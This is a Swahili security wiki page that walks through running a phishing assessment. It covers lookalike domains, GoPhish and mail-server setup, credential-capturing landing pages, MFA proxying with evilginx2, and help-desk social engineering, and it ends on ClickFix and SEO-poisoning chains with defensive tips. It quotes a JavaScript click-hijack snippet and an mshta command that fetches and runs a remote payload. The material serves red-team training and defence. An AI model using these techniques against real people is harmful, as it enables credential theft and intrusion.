# Mbinu ya Phishing

{{#include ../../banners/hacktricks-training.md}}

## Mbinu

1. Fanya Recon ya mwathiriwa
   1. Chagua **domain ya mwathiriwa**.
   2. Fanya uchunguzi wa msingi wa wavuti **kutafuta kurasa za kuingia** zinazotumiwa na mwathiriwa na **amua** ni ipi utakayo **iga**.
   3. Tumia **OSINT** **kupata barua pepe**.
2. Andaa mazingira
   1. **Nunua domain** utakayotumia kwa tathmini ya phishing
   2. **Sanidi rekodi zinazohusiana na huduma ya barua pepe** (SPF, DMARC, DKIM, rDNS)
   3. Sanidi VPS kwa **gophish**
3. Andaa kampeni
   1. Andaa **kiolezo cha barua pepe**
   2. Andaa **ukurasa wa wavuti** wa kuiba taarifa za kuingia
4. Zindua kampeni!

## Tengeneza majina ya domain yanayofanana au nunua domain inayoaminika

### Mbinu za Kubadilisha Majina ya Domain

- **Keyword**: Jina la domain **linajumuisha** **keyword** muhimu ya domain asili (k.m., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Badilisha **nukta kuwa kistari** katika subdomain (k.m., www-zelster.com).
- **New TLD**: Domain ileile yenye **TLD mpya** (k.m., zelster.org)
- **Homoglyph**: **Hubadilisha** herufi moja katika jina la domain na **herufi zinazofanana kwa mwonekano** (k.m., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Hubadilishana nafasi za herufi mbili** ndani ya jina la domain (k.m., zelsetr.com).
- **Singularization/Pluralization**: Huongeza au kuondoa “s” mwishoni mwa jina la domain (k.m., zeltsers.com).
- **Omission**: **Huondoa herufi moja** kwenye jina la domain (k.m., zelser.com).
- **Repetition:** **Hurudia herufi moja** katika jina la domain (k.m., zeltsser.com).
- **Replacement**: Kama homoglyph, lakini si ya siri sana. Hubadilisha herufi moja katika jina la domain, labda kwa herufi iliyo karibu nayo kwenye kibodi (k.m., zektser.com).
- **Subdomained**: Weka **nukta** ndani ya jina la domain (k.m., ze.lster.com).
- **Insertion**: **Huongeza herufi** ndani ya jina la domain (k.m., zerltser.com).
- **Missing dot**: Ongeza TLD mwishoni mwa jina la domain. (k.m., zelstercom.com)

**Zana za Kiotomatiki**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Tovuti**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Kuna **uwezekano kwamba baadhi ya bits zilizohifadhiwa au zinazosafirishwa zinaweza kubadilika zenyewe** kutokana na sababu mbalimbali kama vile miale ya jua, miale ya cosmic au hitilafu za maunzi.

Dhana hii **inapotumika kwa maombi ya DNS**, inawezekana **domain inayopokelewa na seva ya DNS** isiwe sawa na domain iliyoombwa awali.

Kwa mfano, kubadilisha bit moja kwenye domain "windows.com" kunaweza kuibadilisha kuwa "windnws.com."

Washambuliaji wanaweza **kunufaika na hili kwa kusajili domains nyingi za bit-flipping** zinazofanana na domain ya mwathiriwa. Lengo lao ni kuelekeza watumiaji halali kwenye miundombinu yao wenyewe.

Kwa maelezo zaidi, soma [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Nunua domain inayoaminika

Unaweza kutafuta domain iliyoisha muda wake unayoweza kutumia kwenye [https://www.expireddomains.net/](https://www.expireddomains.net).\
Ili kuhakikisha kuwa domain iliyoisha muda wake unayopanga kununua **tayari ina SEO nzuri**, unaweza kutafuta jinsi ilivyowekwa katika kategoria kwenye:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Kugundua Barua Pepe

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (bure 100%)
- [https://phonebook.cz/](https://phonebook.cz) (bure 100%)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Ili **kugundua** anwani zaidi za barua pepe halali au **kuthibitisha zile** ambazo tayari umegundua, unaweza kuangalia kama unaweza kuzifanyia brute-force seva za SMTP za mwathiriwa. [Jifunze jinsi ya kuthibitisha/kugundua anwani za barua pepe hapa](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Pia, usisahau kwamba ikiwa watumiaji wanatumia **portal yoyote ya wavuti kufikia barua pepe zao**, unaweza kuangalia kama inaathiriwa na **username brute force**, na kutumia udhaifu huo ikiwezekana.

## Kusani GoPhish

### Usakinishaji

Unaweza kuipakua kutoka [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pakua na uifungue ndani ya `/opt/gophish`, kisha endesha `/opt/gophish/gophish`\
Utapewa nenosiri la mtumiaji wa admin kwenye port 3333 katika matokeo. Kwa hiyo, fikia port hiyo na utumie taarifa hizo za kuingia kubadilisha nenosiri la admin. Huenda ukahitaji kuelekeza port hiyo kwenye local:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Usanidi

**Usanidi wa cheti cha TLS**

Kabla ya hatua hii, unapaswa kuwa **tayari umenunua domain** utakayotumia, na lazima iwe **imeelekezwa** kwenye **IP ya VPS** unayosanidi **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Usanidi wa barua pepe**

Anza kwa kusakinisha: `apt-get install postfix`

Kisha ongeza domain kwenye faili zifuatazo:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Pia badilisha thamani za variable zifuatazo ndani ya /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Hatimaye, rekebisha faili **`/etc/hostname`** na **`/etc/mailname`** ziwe na jina la domain yako na **uwashe upya VPS yako.**

Sasa, tengeneza **DNS A record** ya `mail.<domain>` inayoelekeza kwenye **anwani ya IP** ya VPS na **DNS MX record** inayoelekeza kwenye `mail.<domain>`

Sasa tujaribu kutuma barua pepe:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Usanidi wa Gophish**

Simamisha utekelezaji wa gophish na tuisanidi.\
Rekebisha `/opt/gophish/config.json` iwe kama ifuatavyo (zingatia matumizi ya https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Sanidi huduma ya gophish**

Ili kuunda huduma ya gophish inayoweza kuwashwa kiotomatiki na kusimamiwa kama huduma, unaweza kuunda faili `/etc/init.d/gophish` yenye maudhui yafuatayo:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Malizia kusanidi huduma na uikague kwa kufanya:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Kusanidi seva ya barua pepe na domain

### Subiri na uwe halali

Kadiri domain inavyokuwa ya zamani, ndivyo uwezekano wa kukamatwa kama spam unavyopungua. Kwa hiyo, unapaswa kusubiri kwa muda mrefu iwezekanavyo (angalau wiki 1) kabla ya tathmini ya phishing. Zaidi ya hayo, ukiweka ukurasa kuhusu sekta yenye sifa nzuri, sifa utakayopata itakuwa bora zaidi.

Kumbuka kwamba hata kama itabidi usubiri wiki moja, unaweza kumaliza kusanidi kila kitu sasa.

### Sanidi rekodi ya Reverse DNS (rDNS)

Weka rekodi ya rDNS (PTR) inayotatua anwani ya IP ya VPS kuwa jina la domain.

### Rekodi ya Sender Policy Framework (SPF)

Lazima **usanidi rekodi ya SPF kwa domain mpya**. Ikiwa hujui rekodi ya SPF ni nini, [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Unaweza kutumia [https://www.spfwizard.net/](https://www.spfwizard.net) kutengeneza sera yako ya SPF (tumia IP ya mashine ya VPS)

![Fomu ya SPF Wizard ya kutengeneza rekodi ya SPF kwa domain ya phishing](<../../images/image (1037).png>)

Haya ndiyo maudhui yanayopaswa kuwekwa ndani ya rekodi ya TXT kwenye domain:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Rekodi ya Domain-based Message Authentication, Reporting & Conformance (DMARC)

Lazima **usanidi rekodi ya DMARC kwa domain mpya**. Ikiwa hujui rekodi ya DMARC ni nini, [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Unapaswa kuunda rekodi mpya ya DNS TXT inayoelekeza kwenye hostname `_dmarc.<domain>` yenye maudhui yafuatayo:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Lazima **usanidi DKIM kwa domain mpya**. Ikiwa hujui rekodi ya DKIM ni nini, [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Mafunzo haya yanatokana na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Unahitaji kuunganisha thamani zote mbili za B64 zinazozalishwa na ufunguo wa DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Pima alama ya usanidi wa barua pepe yako

Unaweza kufanya hivyo kwa kutumia [https://www.mail-tester.com/](https://www.mail-tester.com)\
Tembelea tu ukurasa huo na utume barua pepe kwa anwani watakayokupa:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Unaweza pia **kuangalia usanidi wa barua pepe yako** kwa kutuma barua pepe kwa `check-auth@verifier.port25.com` na **kusoma jibu** (kwa hili utahitaji **kufungua** port **25** na kuangalia jibu kwenye faili _/var/mail/root_ ikiwa utatuma barua pepe ukiwa root).\
Hakikisha unapita majaribio yote:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Unaweza pia kutuma **ujumbe kwa akaunti ya Gmail unayoidhibiti**, kisha uangalie **vichwa vya barua pepe** kwenye kikasha chako cha Gmail. `dkim=pass` inapaswa kuwepo kwenye sehemu ya kichwa cha `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Kuondoa kwenye Orodha Nyeusi ya Spamhaus

Ukurasa wa [www.mail-tester.com](https://www.mail-tester.com) unaweza kukuonyesha ikiwa domain yako imezuiwa na Spamhaus. Unaweza kuomba domain/IP yako iondolewe hapa: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Kuondoa kwenye Orodha Nyeusi ya Microsoft

​​Unaweza kuomba domain/IP yako iondolewe hapa: [https://sender.office.com/](https://sender.office.com).

## Kuunda na Kuanzisha Kampeni ya GoPhish

### Wasifu wa Kutuma

- Weka **jina la kutambua** wasifu wa mtumaji
- Amua utatuma barua pepe za phishing kutoka akaunti ipi. Mapendekezo: _noreply, support, servicedesk, salesforce..._
- Unaweza kuacha sehemu za username na password wazi, lakini hakikisha umechagua Ignore Certificate Errors

![Kuunda na Kuanzisha Kampeni ya GoPhish - Wasifu wa Kutuma: Unaweza kuacha sehemu za username na password wazi, lakini hakikisha umechagua Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Inapendekezwa kutumia kipengele cha "**Send Test Email**" ili kujaribu kama kila kitu kinafanya kazi.\
> Ningependekeza **kutuma barua pepe za majaribio kwenye anwani za 10min mail** ili kuepuka kuwekwa kwenye orodha nyeusi wakati wa kufanya majaribio.

### Kiolezo cha Barua Pepe

- Weka **jina la kutambua** kiolezo
- Kisha andika **mada** (usiandike kitu cha ajabu, andika tu kitu ambacho ungetarajia kusoma kwenye barua pepe ya kawaida)
- Hakikisha umechagua "**Add Tracking Image**"
- Andika **kiolezo cha barua pepe** (unaweza kutumia variables kama kwenye mfano ufuatao):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Kumbuka kuwa **ili kuongeza uaminifu wa barua pepe**, inapendekezwa kutumia saini kutoka kwenye barua pepe ya mteja. Mapendekezo:

- Tuma barua pepe kwa **anwani isiyokuwepo** na uangalie kama jibu lina saini.
- Tafuta **barua pepe za umma** kama info@ex.com au press@ex.com au public@ex.com, uzitumie barua pepe na usubiri jibu.
- Jaribu kuwasiliana na barua pepe **halali iliyogunduliwa** na usubiri jibu

![Sending Profile - Email Template: Jaribu kuwasiliana na barua pepe halali iliyogunduliwa na usubiri jibu](<../../images/image (80).png>)

> [!TIP]
> Email Template pia inaruhusu **kuambatisha faili za kutuma**. Ikiwa ungependa pia kuiba changamoto za NTLM kwa kutumia faili/nyaraka zilizoundwa mahususi, [soma ukurasa huu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Ukurasa wa Kutua

- Andika **jina**
- **Andika msimbo wa HTML** wa ukurasa wa wavuti. Kumbuka kuwa unaweza **kuingiza** kurasa za wavuti.
- Weka alama kwenye **Capture Submitted Data** na **Capture Passwords**
- Weka **uelekezaji**

![Email Template - Landing Page: Weka alama kwenye Capture Submitted Data na Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Kwa kawaida utahitaji kurekebisha msimbo wa HTML wa ukurasa na kufanya majaribio kwenye mazingira ya ndani (labda ukitumia seva ya Apache) **hadi uridhike na matokeo.** Kisha, andika msimbo huo wa HTML kwenye kisanduku.\
> Kumbuka kuwa ikiwa unahitaji **kutumia rasilimali tuli** za HTML (labda kurasa za CSS na JS), unaweza kuzihifadhi kwenye _**/opt/gophish/static/endpoint**_ na kisha kuzifikia kupitia _**/static/\<filename>**_

> [!TIP]
> Kwa uelekezaji unaweza **kuwaelekeza watumiaji kwenye ukurasa mkuu halali wa wavuti** wa mwathiriwa, au kuwaelekeza kwenye _/static/migration.html_ kwa mfano, kuweka **gurudumu linalozunguka (**[**https://loading.io/**](https://loading.io)**) kwa sekunde 5 kisha kuonyesha kuwa mchakato umefaulu**.

### Watumiaji na Vikundi

- Weka jina
- **Ingiza data** (kumbuka kuwa ili kutumia templeti ya mfano, unahitaji jina la kwanza, jina la mwisho na anwani ya barua pepe ya kila mtumiaji)

![Landing Page - Users & Groups: Ingiza data (kumbuka kuwa ili kutumia templeti ya mfano, unahitaji jina la kwanza, jina la mwisho na anwani ya barua pepe ya kila mtumiaji)](<../../images/image (163).png>)

### Kampeni

Hatimaye, unda kampeni kwa kuchagua jina, templeti ya barua pepe, ukurasa wa kutua, URL, Sending Profile na kikundi. Kumbuka kuwa URL ndiyo kiungo kitakachotumwa kwa wahasiriwa.

Kumbuka kuwa **Sending Profile inaruhusu kutuma barua pepe ya majaribio ili kuona jinsi barua pepe ya mwisho ya phishing itakavyoonekana**:

![Users & Groups - Campaign: Kumbuka kuwa Sending Profile inaruhusu kutuma barua pepe ya majaribio ili kuona jinsi barua pepe ya mwisho ya phishing itakavyoonekana](<../../images/image (192).png>)

Kila kitu kikiwa tayari, anzisha tu kampeni!

## Kuiga Tovuti

Ikiwa kwa sababu yoyote unataka kuiga tovuti, angalia ukurasa ufuatao:


{{#ref}}
clone-a-website.md
{{#endref}}

## Nyaraka na Faili zenye Backdoor

Katika baadhi ya tathmini za phishing (hasa kwa Red Teams), utataka pia **kutuma faili zenye aina fulani ya backdoor** (labda C2 au kitu kitakachochochea tu uthibitishaji).\
Angalia ukurasa ufuatao kwa mifano:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing ya MFA

### Kupitia Proxy MitM

Shambulio lililotangulia ni la ujanja sana kwa kuwa unaghushi tovuti halisi na kukusanya taarifa anazoingiza mtumiaji. Kwa bahati mbaya, ikiwa mtumiaji hakuingiza nenosiri sahihi au ikiwa programu uliyoighushi imesanidiwa kwa 2FA, **taarifa hizi hazitakuwezesha kujifanya mtumiaji aliyedanganywa**.

Hapa ndipo zana kama [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) na [**muraena**](https://github.com/muraenateam/muraena) zinapofaa. Zana hii itakuwezesha kufanya shambulio la aina ya MitM. Kimsingi, mashambulio hufanya kazi kwa njia ifuatayo:

1. **Unaiga fomu ya kuingia** ya ukurasa halisi wa wavuti.
2. Mtumiaji **hutuma** **vitambulisho vyake** kwenye ukurasa wako bandia, na zana hutuma hivyo kwenye ukurasa halisi wa wavuti, **ikiangalia kama vitambulisho vinafanya kazi**.
3. Ikiwa akaunti imesanidiwa kwa **2FA**, ukurasa wa MitM utaiomba, na mtumiaji **akiingiza** msimbo huo, zana itautuma kwenye ukurasa halisi wa wavuti.
4. Mtumiaji akishaingia, wewe (kama mshambulizi) utakuwa **umekusanya vitambulisho, 2FA, cookie na taarifa zozote** kutoka kwenye mwingiliano wote alioufanya mtumiaji wakati zana inatekeleza MitM.

### Kupitia VNC

Badala ya **kumpeleka mwathiriwa kwenye ukurasa hasidi** unaofanana na ule wa asili, vipi ukimpeleka kwenye **kipindi cha VNC chenye kivinjari kilichounganishwa na ukurasa halisi wa wavuti**? Utaweza kuona anachofanya, kuiba nenosiri, MFA anayotumia, cookies...\
Unaweza kufanya hivi kwa kutumia [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Kugundua Ugunduzi

Ni wazi kuwa mojawapo ya njia bora za kujua kama umenaswa ni **kutafuta domain yako kwenye orodha zisizoruhusiwa**. Ikiwa imeorodheshwa, ina maana kuwa kwa namna fulani domain yako ilitambuliwa kuwa ya kutiliwa shaka.\
Njia rahisi ya kuangalia kama domain yako imo kwenye orodha yoyote isiyoruhusiwa ni kutumia [https://malwareworld.com/](https://malwareworld.com)

Hata hivyo, kuna njia nyingine za kujua kama mwathiriwa **anatafuta kwa bidii shughuli za phishing zinazotiliwa shaka mtandaoni**, kama ilivyoelezwa katika:


{{#ref}}
detecting-phising.md
{{#endref}}

Unaweza **kununua domain yenye jina linalofanana sana** na domain ya mwathiriwa **na/au kutoa certificate** ya **subdomain** ya domain unayodhibiti **yenye** **neno kuu** la domain ya mwathiriwa. Ikiwa **mwathiriwa** atafanya aina yoyote ya **mwingiliano wa DNS au HTTP** na hizo, utajua kuwa **anatafuta kwa bidii** domain zinazotiliwa shaka na utahitaji kujificha sana.<sup>[[2]](#references)</sup>

### Tathmini phishing

Tumia [**Phishious** ](https://github.com/Rices/Phishious)kutathmini kama barua pepe yako itaishia kwenye folda ya barua taka au itazuiwa au kufanikiwa.

## Uhujumu wa Utambulisho Unaohitaji Mawasiliano ya Karibu (Kuweka Upya MFA kupitia Help Desk)

Vikundi vya kisasa vya uvamizi vinazidi kuacha kabisa vishawishi vya barua pepe na **kulenga moja kwa moja mchakato wa dawati la huduma / urejeshaji wa utambulisho** ili kushinda MFA. Shambulio hili hutumia kikamilifu zana zilizopo kwenye mfumo: mara tu mhusika anapopata vitambulisho halali, hutumia zana za usimamizi zilizojengewa ndani kuendelea na uvamizi — hakuna malware inayohitajika.<sup>[[6]](#references)</sup>

### Mtiririko wa shambulio
1. Fanya upelelezi kuhusu mwathiriwa 
   * Kusanya taarifa binafsi na za kikazi kutoka LinkedIn, uvujaji wa data, GitHub ya umma, n.k.  
   * Tambua utambulisho wenye thamani kubwa (watendaji wakuu, IT, fedha) na chunguza **utaratibu kamili wa help desk** wa kuweka upya nenosiri / MFA.
2. Uhandisi wa kijamii wa wakati halisi  
   * Piga simu, wasiliana kupitia Teams au chat na help desk huku ukijifanya mlengwa (mara nyingi kwa kutumia **caller-ID iliyoghushiwa** au **sauti iliyonakiliwa**).  
   * Toa PII iliyokusanywa awali ili kupita uthibitishaji unaotegemea maarifa.  
   * Mshawishi wakala **aweke upya siri ya MFA** au afanye **SIM-swap** kwenye nambari ya simu iliyosajiliwa.
3. Hatua za mara moja baada ya kupata ufikiaji (≤60 min katika matukio halisi)  
   * Jipatie ufikiaji wa awali kupitia portal yoyote ya wavuti ya SSO.  
   * Chunguza AD / AzureAD kwa kutumia zana zilizojengewa ndani (hakuna binaries zinazowekwa):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateral movement kwa kutumia **WMI**, **PsExec**, au mawakala halali wa **RMM** ambao tayari wameidhinishwa kwenye mazingira.

### Utambuzi na Upunguzaji wa Hatari
* Chukulia urejeshaji wa utambulisho kupitia help desk kama **operesheni yenye ruhusa za juu** – hitaji uthibitishaji wa ziada na idhini ya meneja.
* Weka sheria za **Identity Threat Detection & Response (ITDR)** / **UEBA** zinazotoa arifa kuhusu:  
  * Mbinu ya MFA kubadilishwa + uthibitishaji kutoka kifaa / eneo jipya.  
  * Kuongezewa ruhusa mara moja kwa principal yuleyule (user-→-admin).  
* Rekodi simu za help desk na hitaji **kupiga tena nambari ambayo tayari imesajiliwa** kabla ya kufanya reset yoyote.
* Tekeleza **Just-In-Time (JIT) / Privileged Access** ili akaunti zilizofanyiwa reset zisirithi kiotomatiki tokeni zenye ruhusa za juu.

---

## Udanganyifu wa Kiwango Kikubwa – SEO Poisoning na Kampeni za “ClickFix”
Vikundi vya kawaida vya wahalifu hupunguza gharama za operesheni zinazohitaji mwingiliano mkubwa kwa mashambulizi ya kiwango kikubwa yanayogeuza **injini za utafutaji na mitandao ya matangazo kuwa njia za kusambaza mashambulizi**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** huweka matokeo bandia kama `chromium-update[.]site` juu kabisa kwenye matangazo ya utafutaji.
2. Mlengwa hupakua **first-stage loader** ndogo (mara nyingi JS/HTA/ISO).  Mifano iliyoonekana na Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader hutoa cookies za kivinjari na hifadhidata za vitambulisho, kisha hupakua **silent loader** inayoamua – *kwa wakati halisi* – kama itasakinisha:
   * RAT (kwa mfano, AsyncRAT, RustDesk)
   * ransomware / wiper
   * kipengele cha persistence (ufunguo wa registry Run + scheduled task)

### Vidokezo vya Kuimarisha Usalama
* Zuia domains zilizosajiliwa hivi karibuni na utekeleze **Advanced DNS / URL Filtering** kwenye *matangazo ya utafutaji* pamoja na barua pepe.
* Zuia usakinishaji wa programu kwa vifurushi vya MSI vilivyosainiwa / Store pekee, na ukatae utekelezaji wa `HTA`, `ISO`, `VBS` kupitia policy.
* Fuatilia child processes za vivinjari zinapofungua installers:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Tafuta LOLBins zinazotumiwa vibaya mara kwa mara na first-stage loaders (k.m. `regsvr32`, `curl`, `mshta`).

### Utekaji wa kubofya kitufe cha upakuaji kwa makabidhiano ya TDS
Baadhi ya tovuti bandia za programu huacha `href` ya upakuaji inayoonekana ikielekeza kwenye URL **halisi** ya GitHub/release, lakini huteka mwingiliano **wa kwanza** wa mtumiaji kwa JavaScript na kumpeleka mwathiriwa kwenye mfululizo wa **Traffic Distribution System (TDS)** badala yake.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Sifa kuu:
- Hook kwa kawaida huendeshwa kwenye **capture phase** (`true`) ya `document`, kwa hiyo hutekelezwa kabla ya handlers za tovuti.
- Chrome mara nyingi hutumia `mousedown` badala ya `click` ili kuweka redirect ikihusishwa na **ishara halali ya mtumiaji** na kuboresha uwezo wa kukwepa vizuizi vya popup.
- Baadhi ya variants hufungua mapema `about:blank` au huunda mibofyo ya `<a target="_blank">`, kisha huweka URL ya TDS baadaye.
- Vikomo vya upande wa browser mara nyingi huhifadhiwa kwenye `localStorage`, kwa hiyo **mibofyo ya kwanza** inaweza kumfikisha mtumiaji kwenye malware, huku refresh/retry zikielekezwa kwenye link inayoonekana salama.
- TDS inaweza kuchuja kwa referrer, entry domain, GEO, fingerprint ya browser/device, ukaguzi wa VPN/datacenter, muktadha wa click na vihesabu vya kila session; hivyo marudio ya mchambuzi yanaweza kutoa matokeo yasiyotabirika.

Mawazo ya kujilinda:
- Linganisha `href` **inayoonyeshwa** na target halisi ya navigation inayozalishwa wakati wa kubofya.
- Tafuta handlers za `document.addEventListener(..., true)` zinazotumia `preventDefault()` na `stopImmediatePropagation()` pamoja na `window.open`, `about:blank` au mibofyo ya anchor iliyoundwa.
- Chukulia makundi ya domain mpya zilizosajiliwa za kupakua software, ambazo zote hupakia stage ileile ya CloudFront/JS, kama muundo wenye ishara kali wa SEO-poisoning/TDS.

### ClickFix kutoka kwenye kurasa ghushi za uthibitishaji + upakuaji wa LOLBAS unaofanana na archive
Baadhi ya matawi ya TDS huishia kwenye ukurasa ghushi wa uthibitishaji (mtindo wa Cloudflare/IUAM) unaomwambia mwathiriwa aendeshe binary inayoaminika ya Windows kama vile:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Maelezo:
- `mshta.exe` hutekeleza **HTA/VBScript mwanzoni mwa jibu**, hata kama URL inajifanya kuwa kumbukumbu ya `.7z`; data ya kumbukumbu iliyoongezwa inaweza kuwa chambo tupu.
- Hatua zinazofuata mara nyingi huendelea kudanganya kuhusu aina ya faili (`.rtf` kwa PowerShell, `.asar` kwa Python, ZIP zenye binaries zilizoongezewa padding), kisha hubadilika na kutumia **manual PE mapping / in-memory execution**.
- Ukijibu mojawapo ya misururu hii, hifadhi **network + memory kuanzia utekelezaji wa kwanza uliofanikiwa**: marudio ya baadaye yanaweza kuonyesha tu njia salama ya installer/SFX au kushindwa kwa sababu utoaji wa payload/key ulihusishwa na session ya awali ya TDS.

### Mbinu ya uwasilishaji wa DLL ya ClickFix (sasisho bandia la CERT)
